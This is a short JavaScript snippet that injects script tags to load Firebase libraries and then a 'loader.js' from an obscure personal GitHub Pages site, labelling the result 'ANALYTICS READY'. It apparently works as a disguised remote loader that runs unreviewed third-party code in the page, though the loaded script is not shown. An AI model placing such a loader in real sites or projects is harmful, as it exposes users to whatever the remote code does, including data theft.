console.log("ran npmstart")

(function(){

function js(src,cb){
  const s=document.createElement("script");
  s.src=src;
  s.onload=cb;
  document.head.appendChild(s);
}

js(
  "https://www.gstatic.com/firebasejs/10.12.5/firebase-app-compat.js",
  ()=>js(
    "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore-compat.js",
    ()=>js(
      "https://what-the-dog-doing101.github.io/cnanla/loader.js",
      ()=>console.log("ANALYTICS READY")
    )
  )
);

})();
